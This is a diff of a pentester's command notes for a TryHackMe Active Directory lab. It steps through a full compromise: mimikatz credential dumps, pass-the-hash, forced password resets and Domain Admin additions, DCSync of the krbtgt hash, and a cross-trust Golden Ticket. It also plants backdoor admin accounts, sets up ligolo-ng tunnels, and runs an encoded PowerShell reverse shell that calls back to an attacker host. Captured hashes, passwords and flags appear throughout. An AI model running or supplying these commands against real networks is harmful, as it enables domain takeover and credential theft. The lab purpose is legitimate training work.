+    m/u : 7fa121143683ce59d737254e78956ddc92952de1 / 221eedf911ba1f496cbfa1f632adfc2372ca6cc0
+
+Secret  : NL$KM
+cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
+old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
+
+mimikatz(commandline) # exit
+Bye!
+
+
+//Secret: $MACHINE.ACC
+//NTLM: fc04ffd9bd842c6189411efe21afc9a0
+
+//Test Authentication
+nxc ldap 10.200.171.122 -u 'SERVER2$' -H 'fc04ffd9bd842c6189411efe21afc9a0'
+LDAP        10.200.171.122  389    DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:ai.vanchat.loc) (signing:None) (channel binding:Never)                                                                                                                  
+LDAP        10.200.171.122  389    DC1              [+] ai.vanchat.loc\SERVER2$:fc04ffd9bd842c6189411efe21afc9a0 
+
+//SUCCESS!!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Shell as QW0.HANNAH.HARDY
+//This account was chosen based on the BloodHound output for domain admin.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+nxc smb 10.200.171.122 -u 'SERVER2$' -H 'fc04ffd9bd842c6189411efe21afc9a0' --generate-hosts-file hosts-122
+
+SMB         10.200.171.122  445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:ai.vanchat.loc) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                        
+SMB         10.200.171.122  445    DC1              [+] ai.vanchat.loc\SERVER2$:fc04ffd9bd842c6189411efe21afc9a0
+
+//Add hosts
+cat hosts-122 | sudo tee -a /etc/hosts
+
+// bloodyAD
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2026-05-02 23:50:59 EDT -- 
+//Change password for QW0.HANNAH.HARDY
+bloodyAD --host 10.200.171.122 -d 'ai.vanchat.loc' -u 'SERVER2$' -p ':fc04ffd9bd842c6189411efe21afc9a0' set password 'QW0.HANNAH.HARDY' 'Pwned123!'
+[+] Password changed successfully!
+
+//Add user to Domain Admins
+bloodyAD --host 10.200.171.122 -d 'ai.vanchat.loc' -u 'SERVER2$' -p ':fc04ffd9bd842c6189411efe21afc9a0' add groupMember 'Domain Admins' 'QW0.HANNAH.HARDY'
+[+] QW0.HANNAH.HARDY added to Domain Admins
+
+//Check new authentication
+nxc smb 10.200.171.122 -u 'QW0.HANNAH.HARDY' -p 'Pwned123!'
+
+SMB         10.200.171.122  445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:ai.vanchat.loc) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.200.171.122  445    DC1              [+] ai.vanchat.loc\QW0.HANNAH.HARDY:Pwned123! (Pwn3d!)
+
+//SUCCESS!!! 
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+## EXTRA KeyPass method
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
 // AI\qw1.lucy.fry xfreeRDP
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-2026-03-25 23:29:12 EDT -- 
 xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /d:ai.vanchat.loc /u:qw1.lucy.fry /p:'P@ssw0rd123!' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
 whoami
@@ -1037,9 +1284,6 @@ xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /u:adm /p:'8XX8N5VBFprFfm
 
 //Open Admin PowerShell
 
-#Admin flag
-cat C:\Users\Administrator\root.txt
-//THM{496fde67-1d0d-4776-833d-b6371f290eac}
 
 //Now that we got all the flags for this box, lets switch back to a domain account.
 
@@ -1062,6 +1306,10 @@ The command completed successfully.
 //SUCCESS!! Connection
 
 
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
@@ -1073,13 +1321,42 @@ The command completed successfully.
 		10.0.17763 N/A Build 17763 
 
 //CREDS:
-		qw1.brian.singh : _4v41yVd$!DW
+    QW0.HANNAH.HARDY@AI.VANCHAT.LOC : Pwned123!
+
 //Flags:
 #User:		THM{1dac8c6b-908e-4100-9deb-f53e68df840d}
 #System:	THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//RustScan
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+wget https://github.com/bee-san/RustScan/releases/download/2.4.1/rustscan.deb.zip
+
+unzip -l rustscan.deb.zip                              
+Archive:  rustscan.deb.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+  4861888  2025-02-23 15:10   rustscan.tmp0-stripped
+  1716964  2025-02-23 15:10   rustscan_2.4.1-1_amd64.deb
+---------                     -------
+  6578852                     2 files
+
+unzip rustscan.deb.zip rustscan_2.4.1-1_amd64.deb
+
+//Install
+sudo dpkg -i rustscan_2.4.1_amd64.deb
+
+rustscan --version                                                
+rustscan 2.4.1
+
+//Run
+rustscan -b 500 -a 10.200.171.122 -- -Pn -sV -sC -oN dc1.nmap
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
 //Find Flags
 cat C:\user.txt
 //THM{1dac8c6b-908e-4100-9deb-f53e68df840d}
@@ -1088,14 +1365,75 @@ cat C:\Users\Administrator\root.txt
 //THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}
 
 
-// Golden Ticket – AI.VANCHAT.LOC
-# After compromising the child domain, I want to try and forge a Golden Ticket to escalate privileges across the trust boundary. 
+// VANCHAT.LOC
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-#Run mimikatz as administrator
+// Bloodhound Enumeration
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// I am now on the Domain controller and I need to collect the AD data again using SharpHound.
+// Lets again use the collector provided by BloodHound-ce.
+
+cp /usr/share/sharphound/SharpHound.exe .
+
+2026-04-13 12:38:15 EDT -- 
+//Run SharpHound
+./SharpHound.exe -c ALL
+
+//Copy Zip through share
+Vanchat_loc_BloodHound.zip
+
+//After ingesting the data I can see a bi-directional trust relationship between the child and parent domain controller. Because there is a bi-directional trust, both domains accept and validate Kerberos tickets issued by each other.
+//As Domain Admin in the child domain, I can extract the child domain’s krbtgt key and forge a Golden Ticket that the parent domain will trust due to the established trust relationship.
+//By setting a high-privilege SID (e.g., Enterprise Admin) in the forged ticket's SIDHistory, the parent domain treats me as a privileged user.
+//This will allows me to authenticate to the parent domain and gain control over its resources and domain controllers.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Ligolo-ng Setup to reach  vanchat.loc
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+First lets create an interface for the child domain controller and clean up the interfaces.
+
+ifcreate --name hoppers-dc1
+route_add --name hoppers-dc1 --route 10.200.171.121/32
+
+//Copy over agent using connected share
+
+//Secure the agent in RDP Admin Powershell
+copy C:\Users\qw0.hannah.hardy\Desktop\agent.exe C:\Windows\Temp\agent.exe
+
+//Run agent.exe in RDP Admin Powershell
+powershell -WindowStyle Hidden -Command "Start-Process 'C:\Windows\Temp\agent.exe' '-connect 10.200.171.11:11602 --ignore-cert' -WorkingDirectory 'C:\Windows\Temp'"
+
+//Got callback, now to ligolo to start session
+session
+tunnel_start --tun hoppers-dc1
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//I should now be able to reach out to .121 the parent domain controller and have access to all the services of the controller.
+
+//Rustscan
+rustscan -b 500 -a 10.200.171.121 -- -Pn -sV -sC -oN rdc1.nmap
+
+
+// Access as Administrator (GoldenTicket::AI.VANCAT.LOC)
+# After compromising the child domain, I want to try and forge a Golden Ticket to escalate privileges across the trust boundary.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Lets perform a Golden Ticket Attack. I first need the krbtgt hash.
+//For this attack I will use a dcsync attack using Mimikatz as Domain admin.
+
+//Copy over mimikatz through the share
+//Start Admin PS
+
+cd C:\Users\qw0.hannah.hardy\Desktop\
+
+2026-05-03 00:33:08 EDT -- 
+.\mimikatz.exe
 
 #Dumping the krbtgt hash via DCSync
 privilege::debug
+
 lsadump::dcsync /domain:ai.vanchat.loc /user:ai\krbtgt
 
 SAM Username         : krbtgt
@@ -1108,25 +1446,60 @@ Object Relative ID   : 502
 
 Credentials:
   Hash NTLM: d816e3b716ded6bc8cfc1feb5d165887
+    ntlm- 0: d816e3b716ded6bc8cfc1feb5d165887
+    lm  - 0: 901986f0452879701c446c3f91cec032
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : dced536fda01f09b01b28ca2892b7571
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : AI.VANCHAT.LOCkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee
+      aes128_hmac       (4096) : 69bc40cf2de61d483d8620a122e096d6
+      des_cbc_md5       (4096) : 1c45190b45d07979
+
+* Primary:Kerberos *
+    Default Salt : AI.VANCHAT.LOCkrbtgt
+    Credentials
+      des_cbc_md5       : 1c45190b45d07979
+
+//Next, I need the Domain SID and the Parent Domain SID. 
+(Get-ADDomain).DomainSID
+
+BinaryLength AccountDomainSid                        Value
+------------ ----------------                        -----
+          24 S-1-5-21-2486023134-1966250817-35160293 S-1-5-21-2486023134-1966250817-35160293
 
 
-#Retrieve the domain SID:
-Get-ADDomain -Identity vanchat.loc | Select-Object -ExpandProperty DomainSID
-        SID_Parent: S-1-5-21-2737471197-2753561878-509622479
+(Get-ADDomain -Identity (Get-ADDomain).ParentDomain).DomainSID
 
+BinaryLength AccountDomainSid                         Value
+------------ ----------------                         -----
+          24 S-1-5-21-2737471197-2753561878-509622479 S-1-5-21-2737471197-2753561878-509622479
 
-#With all required information, lets forge and inject a Golden Ticket:
+//With everything gathered I can use impackets ticketer.py to craft the golden ticket to impersonate the Adminstrator.
 
-mimikatz # kerberos::golden /user:Administrator /domain:ai.vanchat.loc /sid:S-1-5-21-2486023134-1966250817-35160293 /aes256:cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee /id:500 /groups:512 /sids:S-1-5-21-2737471197-2753561878-509622479-519 /ptt
+-nthash d816e3b716ded6bc8cfc1feb5d165887
+-domain-sid S-1-5-21-2486023134-1966250817-35160293
+-aesKey cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee
+-extra-sid S-1-5-21-2737471197-2753561878-509622479-519
+
+//NOTE: I glue the 519 to the parents Domain SID (extra-sid) to impersonate a user from the Enterprise Admins group
+
+//Mimikatz
+kerberos::golden /user:Administrator /domain:ai.vanchat.loc /sid:S-1-5-21-2486023134-1966250817-35160293 /aes256:cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee /sids:S-1-5-21-2737471197-2753561878-509622479-519 /ptt
 
 User      : Administrator
 Domain    : ai.vanchat.loc (AI)
 SID       : S-1-5-21-2486023134-1966250817-35160293
 User Id   : 500
-Groups Id : *512
+Groups Id : *513 512 520 518 519
 Extra SIDs: S-1-5-21-2737471197-2753561878-509622479-519 ;
 ServiceKey: cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee - aes256_hmac
-Lifetime  : 4/4/2026 7:53:06 AM ; 4/1/2036 7:53:06 AM ; 4/1/2036 7:53:06 AM
+Lifetime  : 5/3/2026 4:38:58 AM ; 4/30/2036 4:38:58 AM ; 4/30/2036 4:38:58 AM
 -> Ticket : ** Pass The Ticket **
 
  * PAC generated
@@ -1135,15 +1508,50 @@ Lifetime  : 4/4/2026 7:53:06 AM ; 4/1/2036 7:53:06 AM ; 4/1/2036 7:53:06 AM
  * EncTicketPart encrypted
  * KrbCred generated
 
-Golden ticket for 'Administrator @ ai.vanchat.loc' successfully submitted for current session 
+Golden ticket for 'Administrator @ ai.vanchat.loc' successfully submitted for current session
 
-//We have a GoldenTicket(full Domain Access) for the Administrator user, lets change the password for the account to make easier RDP sessions. 
 
-net user Administrator abc123!!! /domain
-
-//Close RDP session for DC1
+//I have a GoldenTicket(full Domain Access) for the Administrator user!
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Create a user for RDP
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+net user hax Pwned123! /add /domain
+net group "Domain Admins" hax /add /domain
+net localgroup "Remote Desktop Users" hax /add
+net localgroup Administrators hax /add
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+##EXTRA
+// Shell as svc-backup - Domain Admin
+// With access as Administrator I want to issue the following command to add a new Domain Admin called hax.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+$Password = ConvertTo-SecureString "Pwned123!" -AsPlainText -Force
+
+New-ADUser `
+    -Name "svc-backup" `
+    -SamAccountName "svc-backup" `
+    -UserPrincipalName "svc-backup@ai.vanchat.loc" `
+    -AccountPassword $Password `
+    -Enabled $true `
+    -PasswordNeverExpires $true `
+    -ChangePasswordAtLogon $false `
+    -Description "Backup Service Account"
+
+Add-ADGroupMember -Identity "Domain Admins" -Members "svc-backup"
+Add-ADGroupMember -Identity "Remote Desktop Users" -Members "svc-backup"
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
@@ -1153,7 +1561,7 @@ net user Administrator abc123!!! /domain
 - OS: 
 
 //CREDS:
-	Administrator : abc123!!!
+	hax : Pwned123! 
 
 //Flags:
 #User:
@@ -1162,17 +1570,20 @@ net user Administrator abc123!!! /domain
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
+// RDP into RDC1
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
 
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-
-
-
-
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
@@ -1201,7 +1612,13 @@ Enable WebUI? → n
 You should now see:
 Listening on 0.0.0.0:11601
 
-//2. Transfer Agent to Target
+//Create Tunnels
+ifcreate --name hoppers-db
+route_add --name hoppers-db --route 240.0.0.1/32
+route_add --name hoppers-db --route 10.200.171.101/32
+route_add --name hoppers-db --route 10.200.171.102/32
+
+//2. Transfer Agent to db
 
 which ligolo-agent
 /usr/bin/ligolo-agent
@@ -1210,38 +1627,74 @@ cd ~/haxterm/data/SideQuest0/1-db
 
 scp -o "ControlPath=db" /usr/bin/ligolo-agent .:/tmp/agent
 
-//3. Run Agent (Target)
-/tmp/agent -connect 10.249.1.2:11601 -ignore-cert &
+//3. Run Agent (db)
+/tmp/agent -connect 10.249.1.4:11601 -ignore-cert &
 
 //4. Accept Session (Back on Kali)
 #Check Sessions
 session
-start
+tunnel_start --tun hoppers-db
 
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-//Add Routes
-sudo ip route add 10.200.171.101/32 dev ligolo
-sudo ip route add 10.200.171.102/32 dev ligolo
-sudo ip route add 10.200.171.122/32 dev ligolo
-sudo ip route add 10.200.171.121/32 dev ligolo
+//5. Listener on db for SYSTEM
+listener_add --addr 10.200.171.11:1111 --to 0.0.0.0:1111
+listener_add --addr 10.200.171.11:2222 --to 0.0.0.0:2222
 
 
-//Domain Admin to Server2
-xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
+---
 
+## Access to DC1
+ifcreate --name hoppers-server2
+route_add --name hoppers-server2 --route 10.200.171.122/32
 
-//RDP from Server2(10.200.171.102) to DC1(10.200.171.122)
-Use the DC-Connect shortcut for AI.VANCHAT.LOC
-
-
-//RDP from Server2(10.200.171.102) to RDC1(10.200.171.121)
-Use the DC2-Connect shortcut for VANCHAT.LOC
-
-
-vanchat\Administrator
+//5. Create Tunnel
+listener_add --addr 10.200.171.11:11602 --to 0.0.0.0:11601
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+//Start localbox listener for Server1
+cd ~/haxterm/data/SideQuest0/2-server1/penelope/
+python3 penelope.py -p 1111
+
+//Start Callback on Server1 by clicking the shell.msi on the Desktop
+
+//Start localbox listener for Server2
+cd ~/haxterm/data/SideQuest0/2-server1/penelope/
+python3 penelope.py -p 2222
+
+//RDP into Server2 and get SYSTEM
+//Start Admin Powershell as qw1.brian.singh : _4v41yVd$!DW
+
+//Find pid for spoolsv.exe
+tasklist /fi "IMAGENAME eq spoolsv.exe"
+
+cd C:\Users\qw1.brian.singh\Desktop\
+
+//Callback
+.\SeDebugPrivesc.exe 2364 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAwADAALgAxADcAMQAuADEAMQAiACwAMgAyADIAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+
+#SRV2 agent
+//Copy over Ligolo windows agent to remote box (I used the connected share)
+//Secure the agent
+copy C:\Users\qw1.brian.singh\Desktop\agent.exe C:\Windows\Temp\agent.exe
+
+
+//Run agent.exe in the Penolope/SYSTEM shell
+powershell -WindowStyle Hidden -Command "Start-Process 'C:\Windows\Temp\agent.exe' '-connect 10.200.171.11:11602 --ignore-cert' -WorkingDirectory 'C:\Windows\Temp'"
+
+//Got callback, now to ligolo to start session
+session
+tunnel_start --tun hoppers-server2
+
+
+## Access to RDC1
+ifcreate --name hoppers-dc1
+route_add --name hoppers-dc1 --route 10.200.171.121/32
+
+
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
